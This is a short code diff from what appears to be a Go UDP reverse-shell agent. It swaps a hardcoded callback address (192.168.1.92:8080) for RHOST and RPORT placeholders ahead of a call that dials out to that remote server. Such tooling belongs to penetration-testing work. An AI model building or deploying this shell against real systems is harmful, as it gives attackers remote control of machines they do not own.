@@ -10,10 +10,9 @@ import (
 const BUFFSIZE = 1024
 
 func main() {
-	//remoteserver := "192.168.1.92:8080"
 	udpshellproperties := &agentprops.UDPShellProps{
-		RemoteServer: "192.168.1.92",
-		UDPPort:      "8080",
+		RemoteServer: "RHOST",
+		UDPPort:      "RPORT",
 	}
 
 	udpconn, err := udpshellproperties.DialUpUDP()
